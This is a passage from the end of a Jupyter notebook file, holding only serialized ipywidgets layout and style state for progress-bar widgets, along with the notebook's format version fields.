            "value": " 190/190 [00:00&lt;00:00, 15.5kB/s]"
          }
        },
        "6bbb80a179994970b7748738b6e0a55e": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "85bcb9796f63411bb57d11f526653802": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "55089a230d254ba2a93eee63c36c768c": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "88b6a2a1be174813926d67eb497b0d76": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "7a906f87d8164064909a8e405ce38a04": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "974a52f0dcfb450c8c3d8346a30b5c60": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "6b07e8f6dcc14d43bf2598b64b1f4367": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        }
      }
    }
  },
  "nbformat": 4,
  "nbformat_minor": 0
}